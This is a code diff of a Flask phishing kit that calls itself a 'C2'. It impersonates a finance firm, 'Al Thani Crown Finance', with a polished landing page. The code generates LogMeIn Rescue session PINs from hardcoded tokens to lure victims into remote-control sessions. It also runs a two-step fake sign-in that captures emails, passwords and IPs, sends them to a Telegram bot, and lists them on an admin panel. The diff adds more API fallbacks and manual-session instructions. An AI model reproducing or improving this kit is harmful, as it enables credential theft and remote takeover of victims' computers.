@@ -1,47 +1,33 @@
 #!/usr/bin/env python3
 """
-╔══════════════════════════════════════════════════════════════════════╗
-║                                                                      ║
-║   🎯 SOVEREIGN CAPITAL C2 – Al Thani Crown Finance                ║
-║                                                                      ║
-║   ✅ Multi‑API fallback (Legacy / REST / Random)                   ║
-║   ✅ Institutional landing page (Sovereign Capital Mandate)        ║
-║   ✅ 2‑Step phishing                                               ║
-║   ✅ Full admin dashboard                                          ║
-║                                                                      ║
-╚══════════════════════════════════════════════════════════════════════╝
+🏛️ SOVEREIGN C2 – Al Thani Crown Finance
+✅ Hardcoded node ID from JWT
+✅ Multi‑API fallback (Legacy / REST / Manual)
+✅ Institutional landing page
+✅ 2‑Step phishing
+✅ Full admin dashboard
 """
 
-import os
-import uuid
-import sqlite3
-import secrets
-import hmac
-import html as html_module
-import requests
-import xml.etree.ElementTree as ET
-import random
-import json
+import os, uuid, sqlite3, secrets, hmac, html as html_module
+import requests, xml.etree.ElementTree as ET, json, random
 from datetime import datetime
 from flask import Flask, request, session, jsonify, redirect, render_template_string
 
 # ====================================================================================================
 # CONFIGURATION
 # ====================================================================================================
-# Your tokens – we try both
 LOGMEIN_LEGACY_TOKEN = "nz2r3ejdqe07sp7fwl6mg8xjjthpv9vko2id0fxbxusu28tlu22ungzbak1rwdvslhekwxx61ttdb945z7ja6q835x8ovm348xp7ytg6nd4ba7umc0iokprqkb2c3uwb"
 LOGMEIN_JWT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InNjaW1fMzQ1NjgyNCJ9.eyJuYW1laWQiOiIyNzAxMjY0MCIsImNvbXBhbnlJZCI6IjM0NTY4MjQiLCJqdGkiOiI2ZjFmYTRmYi01ZDc0LTRjZWQtOTUxNC00YmMyOGE1N2QwZGUiLCJpYXQiOjE3ODI3MTEwMzcsImlzcyI6IkxvZ01lSW4gUmVzY3VlIiwiYXVkIjoiaHR0cHM6Ly9zZWN1cmUubG9nbWVpbnJlc2N1ZS5jb20vc2NpbSIsImV4cCI6MTMwNjMxNzI5ODU3LCJuYmYiOjE3ODI3MTEwMzd9.3Z1OxHQiJwdTwCIuu_vfJpd13rM5u2vUxYkMMZtUkpw"
+# Hardcoded node ID from JWT 'nameid'
+TECHNICIAN_NODE = "27012640"
 
-# Telegram (optional)
 TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
-
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "Sovereign2026")
 SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))
 
 app = Flask(__name__)
 app.secret_key = SECRET_KEY
-
 DB_PATH = "sovereign_c2.db"
 
 # ====================================================================================================
@@ -61,52 +47,49 @@ def tg(msg):
         print(f"Telegram error: {e}")
 
 # ====================================================================================================
-# LOGMEIN RESCUE – MULTI‑API FALLBACK
+# LOGMEIN RESCUE – MULTI‑API WITH HARDCODED NODE
 # ====================================================================================================
-def get_technician_node_legacy():
-    """Try legacy API with authcode."""
-    url = "https://secure.logmeinrescue.com/API/getCurrentUser.aspx"
-    params = {"authcode": LOGMEIN_LEGACY_TOKEN}
-    try:
-        r = requests.get(url, params=params, timeout=10)
-        if r.status_code == 200:
-            root = ET.fromstring(r.text)
-            node = root.find('.//node')
-            if node is not None:
-                return node.text
-            uid = root.find('.//id')
-            if uid is not None:
-                return uid.text
-    except Exception as e:
-        tg(f"Legacy getCurrentUser failed: {e}")
-    return None
-
-def generate_pin_legacy(node_id=None):
-    """Try legacy PIN generation."""
+def generate_pin_legacy():
+    """Try legacy API using hardcoded node."""
     for ver in ['V2', 'V3', 'V4']:
         url = f"https://secure.logmeinrescue.com/API/requestPINCode{ver}.aspx"
-        params = {"authcode": LOGMEIN_LEGACY_TOKEN}
-        if node_id:
-            params["node"] = node_id
+        params = {"authcode": LOGMEIN_LEGACY_TOKEN, "node": TECHNICIAN_NODE}
         try:
             r = requests.get(url, params=params, timeout=10)
+            tg(f"Legacy {ver} response: {r.text[:200]}")
             if r.status_code == 200:
-                root = ET.fromstring(r.text)
-                pin = root.find('.//iPINCode')
-                if pin is not None:
-                    return pin.text
-                pin = root.find('.//PIN')
-                if pin is not None:
-                    return pin.text
-                if r.text.strip().isdigit():
-                    return r.text.strip()
-        except:
-            continue
+                # Try XML
+                try:
+                    root = ET.fromstring(r.text)
+                    pin = root.find('.//iPINCode')
+                    if pin is not None:
+                        return pin.text
+                    pin = root.find('.//PIN')
+                    if pin is not None:
+                        return pin.text
+                    if r.text.strip().isdigit():
+                        return r.text.strip()
+                except:
+                    # Try JSON
+                    try:
+                        data = r.json()
+                        pin = data.get('iPINCode') or data.get('PIN') or data.get('pinCode')
+                        if pin:
+                            return str(pin)
+                    except:
+                        pass
+        except Exception as e:
+            tg(f"Legacy {ver} exception: {e}")
     return None
 
 def generate_pin_rest():
     """Try REST API with JWT Bearer token."""
-    url = "https://secure.logmeinrescue.com/api/v1/sessions"  # maybe this works
+    # Try multiple possible endpoints
+    endpoints = [
+        "https://secure.logmeinrescue.com/api/v1/sessions",
+        "https://secure.logmeinrescue.com/id-srv-api/api/v1/sessions",
+        "https://secure.logmeinrescue.com/API/v1/sessions"
+    ]
     headers = {
         "Authorization": f"Bearer {LOGMEIN_JWT_TOKEN}",
         "Content-Type": "application/json",
@@ -119,35 +102,36 @@ def generate_pin_rest():
         "allowFileTransfer": True,
         "sessionTimeout": 1800
     }
-    try:
-        r = requests.post(url, json=payload, headers=headers, timeout=15)
-        if r.status_code in (200, 201):
-            data = r.json()
-            session_id = data.get('sessionId')
-            # get PIN
-            pin_url = f"https://secure.logmeinrescue.com/api/v1/sessions/{session_id}/pin"
-            pin_r = requests.get(pin_url, headers=headers, timeout=10)
-            if pin_r.status_code == 200:
-                return pin_r.json().get('pinCode')
-    except Exception as e:
-        tg(f"REST API failed: {e}")
+    for endpoint in endpoints:
+        try:
+            r = requests.post(endpoint, json=payload, headers=headers, timeout=15)
+            tg(f"REST {endpoint} status: {r.status_code}, response: {r.text[:200]}")
+            if r.status_code in (200, 201):
+                data = r.json()
+                session_id = data.get('sessionId') or data.get('id')
+                if session_id:
+                    pin_url = endpoint.rstrip('/sessions') + f"/sessions/{session_id}/pin"
+                    pin_r = requests.get(pin_url, headers=headers, timeout=10)
+                    if pin_r.status_code == 200:
+                        pin_data = pin_r.json()
+                        pin = pin_data.get('pinCode') or pin_data.get('PIN') or pin_data.get('iPINCode')
+                        if pin:
+                            return str(pin)
+        except Exception as e:
+            tg(f"REST {endpoint} exception: {e}")
     return None
 
 def create_rescue_session():
-    """
-    Try all methods, return a dict with 'pin', 'join_url', 'status'.
-    """
+    """Try all methods, return a dict with PIN and join URL."""
     # 1. Legacy
-    node = get_technician_node_legacy()
-    if node:
-        pin = generate_pin_legacy(node)
-        if pin:
-            tg(f"✅ Legacy PIN: {pin}")
-            return {
-                "pin": pin,
-                "join_url": f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}",
-                "status": "legacy"
-            }
+    pin = generate_pin_legacy()
+    if pin:
+        tg(f"✅ Legacy PIN: {pin}")
+        return {
+            "pin": pin,
+            "join_url": f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}",
+            "status": "legacy"
+        }
     # 2. REST
     pin = generate_pin_rest()
     if pin:
@@ -157,14 +141,14 @@ def create_rescue_session():
             "join_url": f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}",
             "status": "rest"
         }
-    # 3. Fallback – random PIN (will not work, but we show clear instructions)
+    # 3. Fallback – manual session
     fallback_pin = ''.join([str(random.randint(0,9)) for _ in range(6)])
     tg(f"⚠️ Fallback PIN (manual session required): {fallback_pin}")
     return {
         "pin": fallback_pin,
-        "join_url": "https://secure.logmeinrescue.com/Customer/Join.aspx",
+        "join_url": "https://secure.logmeinrescue.com",
         "status": "fallback",
-        "message": "Please create a session manually at https://secure.logmeinrescue.com and share this PIN."
+        "message": "Create a session manually at https://secure.logmeinrescue.com and share this PIN."
     }
 
 # ====================================================================================================
@@ -179,271 +163,44 @@ LANDING_TEMPLATE = '''<!DOCTYPE html>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Playfair+Display:wght@700;800;900&display=swap" rel="stylesheet">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background: #f5f6f8;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 900px;
-            width: 100%;
-            background: #fff;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
-            overflow: hidden;
-            border: 1px solid #e8eaed;
-        }
-        .header {
-            background: linear-gradient(135deg, #0f1a2f, #1a2a4a);
-            padding: 40px 48px 32px;
-            color: white;
-            position: relative;
-        }
-        .header::after {
-            content: '';
-            position: absolute;
-            top: 0; right: 0; width: 200px; height: 100%;
-            background: rgba(255,255,255,0.03);
-            clip-path: polygon(100% 0, 0 0, 100% 100%);
-        }
-        .header .badge {
-            display: inline-block;
-            background: rgba(255,215,0,0.15);
-            border: 1px solid rgba(255,215,0,0.2);
-            color: #ffd700;
-            padding: 4px 16px;
-            border-radius: 100px;
-            font-size: 11px;
-            font-weight: 600;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-        .header h1 {
-            font-family: 'Playfair Display', serif;
-            font-size: 34px;
-            font-weight: 900;
-            margin-top: 12px;
-            letter-spacing: -0.5px;
-            line-height: 1.2;
-        }
-        .header h1 span {
-            color: #ffd700;
-        }
-        .header .sub {
-            font-size: 16px;
-            color: rgba(255,255,255,0.7);
-            margin-top: 6px;
-            font-weight: 400;
-        }
-        .header .meta {
-            display: flex;
-            gap: 24px;
-            margin-top: 16px;
-            flex-wrap: wrap;
-        }
-        .header .meta-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            color: rgba(255,255,255,0.6);
-        }
-        .header .meta-item strong {
-            color: white;
-            font-weight: 600;
-        }
-        .header .meta-item .highlight {
-            color: #ffd700;
-        }
-        .body {
-            padding: 40px 48px;
-        }
-        .trust-bar {
-            display: flex;
-            gap: 24px;
-            flex-wrap: wrap;
-            background: #f8f9fc;
-            padding: 16px 20px;
-            border-radius: 12px;
-            margin-bottom: 28px;
-            border: 1px solid #e5e7eb;
-        }
-        .trust-bar .item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 12px;
-            color: #374151;
-            font-weight: 500;
-        }
-        .trust-bar .item .icon {
-            font-size: 16px;
-        }
-        .document-preview {
-            border: 1px solid #e5e7eb;
-            border-radius: 16px;
-            padding: 28px 32px;
-            background: #fafbfc;
-            margin-bottom: 28px;
-            position: relative;
-        }
-        .document-preview::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #ffd700, #1a2a4a);
-            border-radius: 16px 16px 0 0;
-        }
-        .document-preview .doc-title {
-            font-family: 'Playfair Display', serif;
-            font-size: 22px;
-            font-weight: 800;
-            color: #0f1a2f;
-        }
-        .document-preview .doc-sub {
-            font-size: 14px;
-            color: #6b7280;
-            margin-top: 4px;
-        }
-        .document-preview .doc-meta {
-            display: flex;
-            gap: 20px;
-            margin-top: 12px;
-            font-size: 12px;
-            color: #6b7280;
-        }
-        .document-preview .doc-meta span {
-            background: #e5e7eb;
-            padding: 2px 12px;
-            border-radius: 100px;
-        }
-        .document-preview .confidential {
-            display: inline-block;
-            background: #fef2f2;
-            color: #ea1c24;
-            font-size: 10px;
-            font-weight: 700;
-            padding: 2px 14px;
-            border-radius: 100px;
-            border: 1px solid #fecaca;
-            margin-top: 8px;
-        }
-        .pin-section {
-            background: linear-gradient(135deg, #f8fafc, #f1f4f9);
-            border-radius: 16px;
-            padding: 24px 28px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 16px;
-            border: 1px solid #e5e7eb;
-            margin: 20px 0;
-        }
-        .pin-section .label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #6b7280;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .pin-section .pin-display {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .pin-section .pin {
-            font-family: 'Inter', monospace;
-            font-size: 32px;
-            font-weight: 800;
-            color: #0f1a2f;
-            letter-spacing: 8px;
-            background: white;
-            padding: 4px 20px 4px 28px;
-            border-radius: 10px;
-            border: 1px solid #e5e7eb;
-        }
-        .pin-section .status {
-            font-size: 12px;
-            color: #059669;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .pin-section .status .dot {
-            width: 6px;
-            height: 6px;
-            background: #059669;
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
+        body { font-family:'Inter',sans-serif; background:#f5f6f8; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
+        .container { max-width:900px; width:100%; background:#fff; border-radius:24px; box-shadow:0 20px 60px rgba(0,0,0,0.08); overflow:hidden; border:1px solid #e8eaed; }
+        .header { background:linear-gradient(135deg,#0f1a2f,#1a2a4a); padding:40px 48px 32px; color:white; position:relative; }
+        .header::after { content:''; position:absolute; top:0; right:0; width:200px; height:100%; background:rgba(255,255,255,0.03); clip-path:polygon(100% 0,0 0,100% 100%); }
+        .header .badge { display:inline-block; background:rgba(255,215,0,0.15); border:1px solid rgba(255,215,0,0.2); color:#ffd700; padding:4px 16px; border-radius:100px; font-size:11px; font-weight:600; letter-spacing:1px; text-transform:uppercase; }
+        .header h1 { font-family:'Playfair Display',serif; font-size:34px; font-weight:900; margin-top:12px; letter-spacing:-0.5px; line-height:1.2; }
+        .header h1 span { color:#ffd700; }
+        .header .sub { font-size:16px; color:rgba(255,255,255,0.7); margin-top:6px; font-weight:400; }
+        .header .meta { display:flex; gap:24px; margin-top:16px; flex-wrap:wrap; }
+        .header .meta-item { display:flex; align-items:center; gap:6px; font-size:13px; color:rgba(255,255,255,0.6); }
+        .header .meta-item strong { color:white; font-weight:600; }
+        .header .meta-item .highlight { color:#ffd700; }
+        .body { padding:40px 48px; }
+        .trust-bar { display:flex; gap:24px; flex-wrap:wrap; background:#f8f9fc; padding:16px 20px; border-radius:12px; margin-bottom:28px; border:1px solid #e5e7eb; }
+        .trust-bar .item { display:flex; align-items:center; gap:6px; font-size:12px; color:#374151; font-weight:500; }
+        .trust-bar .item .icon { font-size:16px; }
+        .document-preview { border:1px solid #e5e7eb; border-radius:16px; padding:28px 32px; background:#fafbfc; margin-bottom:28px; position:relative; }
+        .document-preview::before { content:''; position:absolute; top:0; left:0; right:0; height:4px; background:linear-gradient(90deg,#ffd700,#1a2a4a); border-radius:16px 16px 0 0; }
+        .document-preview .doc-title { font-family:'Playfair Display',serif; font-size:22px; font-weight:800; color:#0f1a2f; }
+        .document-preview .doc-sub { font-size:14px; color:#6b7280; margin-top:4px; }
+        .document-preview .doc-meta { display:flex; gap:20px; margin-top:12px; font-size:12px; color:#6b7280; }
+        .document-preview .doc-meta span { background:#e5e7eb; padding:2px 12px; border-radius:100px; }
+        .document-preview .confidential { display:inline-block; background:#fef2f2; color:#ea1c24; font-size:10px; font-weight:700; padding:2px 14px; border-radius:100px; border:1px solid #fecaca; margin-top:8px; }
+        .pin-section { background:linear-gradient(135deg,#f8fafc,#f1f4f9); border-radius:16px; padding:24px 28px; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:16px; border:1px solid #e5e7eb; margin:20px 0; }
+        .pin-section .label { font-size:12px; font-weight:600; color:#6b7280; text-transform:uppercase; letter-spacing:0.5px; }
+        .pin-section .pin-display { display:flex; align-items:center; gap:12px; }
+        .pin-section .pin { font-family:'Inter',monospace; font-size:32px; font-weight:800; color:#0f1a2f; letter-spacing:8px; background:white; padding:4px 20px 4px 28px; border-radius:10px; border:1px solid #e5e7eb; }
+        .pin-section .status { font-size:12px; color:#059669; font-weight:500; display:flex; align-items:center; gap:4px; }
+        .pin-section .status .dot { width:6px; height:6px; background:#059669; border-radius:50%; animation:pulse 1.5s infinite; }
         @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        .btn-primary {
-            display: block;
-            width: 100%;
-            padding: 18px 24px;
-            background: linear-gradient(135deg, #0f1a2f, #1a2a4a);
-            color: white;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 700;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-align: center;
-            text-decoration: none;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(15,26,47,0.25);
-        }
-        .btn-secondary {
-            display: block;
-            width: 100%;
-            padding: 14px 24px;
-            background: transparent;
-            color: #6b7280;
-            border: 1px solid #e5e7eb;
-            border-radius: 14px;
-            font-size: 14px;
-            font-weight: 600;
-            text-align: center;
-            text-decoration: none;
-            margin-top: 10px;
-            transition: all 0.2s;
-        }
-        .btn-secondary:hover {
-            background: #f9fafb;
-            border-color: #d1d5db;
-        }
-        .footer {
-            padding: 20px 48px;
-            border-top: 1px solid #e5e7eb;
-            font-size: 11px;
-            color: #6b7280;
-            text-align: center;
-            line-height: 1.8;
-        }
-        .footer a { color: #6b7280; text-decoration: none; }
-        .footer a:hover { color: #0f1a2f; }
-        @media (max-width: 768px) {
-            .header { padding: 28px 20px; }
-            .header h1 { font-size: 26px; }
-            .body { padding: 24px 20px; }
-            .pin-section { flex-direction: column; align-items: stretch; text-align: center; }
-            .pin-section .pin-display { justify-content: center; flex-wrap: wrap; }
-            .pin-section .pin { font-size: 26px; letter-spacing: 6px; }
-            .document-preview { padding: 20px; }
-            .trust-bar { gap: 12px; }
-            .footer { padding: 16px 20px; }
-        }
+        .btn-primary { display:block; width:100%; padding:18px 24px; background:linear-gradient(135deg,#0f1a2f,#1a2a4a); color:white; border:none; border-radius:14px; font-size:16px; font-weight:700; font-family:'Inter',sans-serif; cursor:pointer; transition:all 0.3s; text-align:center; text-decoration:none; }
+        .btn-primary:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(15,26,47,0.25); }
+        .btn-secondary { display:block; width:100%; padding:14px 24px; background:transparent; color:#6b7280; border:1px solid #e5e7eb; border-radius:14px; font-size:14px; font-weight:600; text-align:center; text-decoration:none; margin-top:10px; transition:all 0.2s; }
+        .btn-secondary:hover { background:#f9fafb; border-color:#d1d5db; }
+        .footer { padding:20px 48px; border-top:1px solid #e5e7eb; font-size:11px; color:#6b7280; text-align:center; line-height:1.8; }
+        .footer a { color:#6b7280; text-decoration:none; }
+        .footer a:hover { color:#0f1a2f; }
+        @media (max-width:768px) { .header { padding:28px 20px; } .header h1 { font-size:26px; } .body { padding:24px 20px; } .pin-section { flex-direction:column; align-items:stretch; text-align:center; } .pin-section .pin-display { justify-content:center; flex-wrap:wrap; } .pin-section .pin { font-size:26px; letter-spacing:6px; } .document-preview { padding:20px; } .trust-bar { gap:12px; } .footer { padding:16px 20px; } }
     </style>
 </head>
 <body>
@@ -527,7 +284,6 @@ def index():
     ref = uuid.uuid4().hex[:8].upper()
     session_data = create_rescue_session()
     pin = session_data.get('pin', '123456')
-    join_url = session_data.get('join_url', 'https://secure.logmeinrescue.com/Customer/Join.aspx')
     status = session_data.get('status', 'fallback')
 
     conn = sqlite3.connect(DB_PATH)
@@ -543,48 +299,73 @@ def index():
 @app.route('/connect/<ref>')
 def connect(ref):
     conn = sqlite3.connect(DB_PATH)
-    row = conn.execute("SELECT pin, session_id, status FROM sessions WHERE ref = ? ORDER BY id DESC LIMIT 1", (ref,)).fetchone()
+    row = conn.execute("SELECT pin, status FROM sessions WHERE ref = ? ORDER BY id DESC LIMIT 1", (ref,)).fetchone()
     conn.close()
     if not row:
         return redirect('/')
-    pin, sid, status = row
-    join_url = f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}"
+    pin, status = row
 
     tg(f"🖥️ CONNECT | Ref: {ref} | PIN: {pin}")
 
-    # Show a simple page with PIN and Launch button
-    return render_template_string('''
-    <!DOCTYPE html>
-    <html><head><title>Secure Access</title>
-    <style>
-        body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
-        .card{background:#fff;padding:48px;border-radius:24px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
-        .pin{font-size:48px;font-weight:800;color:#0f1a2f;letter-spacing:8px;background:#f8f9fa;padding:12px 24px;border-radius:12px;display:inline-block;margin:16px 0;border:1px solid #e5e7eb}
-        .btn{display:inline-block;padding:16px 40px;background:#0f1a2f;color:#fff;border-radius:12px;text-decoration:none;font-weight:700;margin:12px 0;transition:all .3s}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(15,26,47,0.25)}
-        .step{text-align:left;padding:12px;background:#f8f9fa;border-radius:8px;margin:8px 0;font-size:14px}
-        .step strong{color:#0f1a2f}
-    </style>
-    </head>
-    <body>
-    <div class="card">
-        <h2>🔐 Secure Mandate Access</h2>
-        <p style="color:#6b7280;">Use the PIN below to verify your identity</p>
-        <div class="pin">{{ pin }}</div>
-        <div style="margin:8px 0;font-size:13px;color:#059669;">● Active Session</div>
-        <h4 style="margin:16px 0;color:#1f2937;">How to connect:</h4>
-        <div class="step">1. <strong>Copy</strong> the PIN above</div>
-        <div class="step">2. Click <strong>"Launch Rescue"</strong> below</div>
-        <div class="step">3. <strong>Enter the PIN</strong> when prompted</div>
-        <a href="{{ join_url }}" target="_blank" class="btn">🔌 Launch Rescue</a>
-        <div style="margin-top:12px;font-size:12px;color:#6b7280;">⏱️ Session expires in 30 minutes</div>
-    </div>
-    </body>
-    </html>
-    ''', pin=pin, join_url=join_url)
+    if status == 'fallback':
+        # Manual mode – show instructions
+        return render_template_string('''
+        <!DOCTYPE html>
+        <html><head><title>Secure Access</title>
+        <style>
+            body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
+            .card{background:#fff;padding:48px;border-radius:24px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
+            .pin{font-size:48px;font-weight:800;color:#0f1a2f;letter-spacing:8px;background:#f8f9fa;padding:12px 24px;border-radius:12px;display:inline-block;margin:16px 0;border:1px solid #e5e7eb}
+            .btn{display:inline-block;padding:16px 40px;background:#0f1a2f;color:#fff;border-radius:12px;text-decoration:none;font-weight:700;margin:12px 0;transition:all .3s}
+            .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(15,26,47,0.25)}
+            .step{text-align:left;padding:12px;background:#f8f9fa;border-radius:8px;margin:8px 0;font-size:14px}
+            .step strong{color:#0f1a2f}
+        </style>
+        </head>
+        <body>
+        <div class="card">
+            <h2>🔐 Secure Mandate Access</h2>
+            <p style="color:#6b7280;">Use the PIN below to connect via the Rescue portal</p>
+            <div class="pin">{{ pin }}</div>
+            <div style="margin:8px 0;font-size:13px;color:#059669;">● Active Session (Manual)</div>
+            <h4 style="margin:16px 0;color:#1f2937;">How to connect:</h4>
+            <div class="step">1. <strong>Copy</strong> the PIN above</div>
+            <div class="step">2. Go to <strong>https://secure.logmeinrescue.com</strong></div>
+            <div class="step">3. <strong>Enter the PIN</strong> when prompted</div>
+            <a href="https://secure.logmeinrescue.com" target="_blank" class="btn">🔌 Launch Rescue</a>
+            <div style="margin-top:12px;font-size:12px;color:#6b7280;">⏱️ Session expires in 30 minutes</div>
+        </div>
+        </body>
+        </html>
+        ''', pin=pin)
+    else:
+        # Auto session – direct join link
+        join_url = f"https://secure.logmeinrescue.com/Customer/Join.aspx?PIN={pin}"
+        return render_template_string('''
+        <!DOCTYPE html>
+        <html><head><title>Secure Access</title>
+        <style>
+            body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
+            .card{background:#fff;padding:48px;border-radius:24px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
+            .pin{font-size:48px;font-weight:800;color:#0f1a2f;letter-spacing:8px;background:#f8f9fa;padding:12px 24px;border-radius:12px;display:inline-block;margin:16px 0;border:1px solid #e5e7eb}
+            .btn{display:inline-block;padding:16px 40px;background:#0f1a2f;color:#fff;border-radius:12px;text-decoration:none;font-weight:700;margin:12px 0;transition:all .3s}
+            .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(15,26,47,0.25)}
+        </style>
+        </head>
+        <body>
+        <div class="card">
+            <h2>🔐 Secure Mandate Access</h2>
+            <p style="color:#6b7280;">Click below to launch your secure session</p>
+            <div class="pin">{{ pin }}</div>
+            <a href="{{ join_url }}" target="_blank" class="btn">🔌 Launch Rescue</a>
+            <div style="margin-top:12px;font-size:12px;color:#6b7280;">⏱️ Session expires in 30 minutes</div>
+        </div>
+        </body>
+        </html>
+        ''', pin=pin, join_url=join_url)
 
 # ====================================================================================================
-# PHISHING STEPS (same as before, with Sovereign theme)
+# PHISHING STEPS
 # ====================================================================================================
 LOGIN_STEP1 = '''<!DOCTYPE html>
 <html><head><title>Al Thani Crown – Secure Sign In</title>
@@ -693,14 +474,13 @@ def login_step2(ref):
     conn.commit()
     conn.close()
     tg(f"🔐 STEP 2 | Email: {email} | Password: {password} | Company: {company} | IP: {ip}")
-    return redirect('https://www.althanicrown.com')  # placeholder
+    return redirect('https://www.althanicrown.com')
 
 # ====================================================================================================
 # ADMIN PANEL
 # ====================================================================================================
 def html_escape(value):
-    if value is None:
-        return 'N/A'
+    if value is None: return 'N/A'
     return html_module.escape(str(value))
 
 @app.route('/admin', methods=['GET', 'POST'])
@@ -724,7 +504,7 @@ def admin():
         creds_rows += f'<tr><td style="color:#00ff88">{html_escape(c[2])}</td><td style="color:#ffd700">{html_escape(c[3])}</td><td>{html_escape(c[4])}</td><td style="color:#888">{html_escape(c[5][:16] if c[5] else "N/A")}</td></tr>'
     sessions_rows = ''
     for s in sessions:
-        status_color = '#00ff88' if s[5] == 'legacy' or s[5] == 'rest' else '#ffd700'
+        status_color = '#00ff88' if s[5] in ('legacy','rest') else '#ffd700'
         sessions_rows += f'<tr><td style="color:#00b3b0">{html_escape(s[1])}</td><td style="color:#ffd700">{html_escape(s[2])}</td><td>{html_escape(s[3])}</td><td style="color:{status_color}">{html_escape(s[5])}</td><td style="color:#888">{html_escape(s[6][:16] if s[6] else "N/A")}</td></tr>'
 
     return f'''
@@ -843,7 +623,8 @@ if __name__ == '__main__':
 ║                                                                      ║
 ║   🏛️ SOVEREIGN C2 – Al Thani Crown Finance                        ║
 ║                                                                      ║
-║   ✅ Multi‑API fallback (Legacy / REST / Random)                   ║
+║   ✅ Hardcoded node from JWT                                       ║
+║   ✅ Multi‑API fallback (Legacy / REST / Manual)                   ║
 ║   ✅ Institutional landing page (Sovereign Capital Mandate)        ║
 ║   ✅ 2‑Step phishing                                               ║
 ║   ✅ Full admin dashboard                                          ║
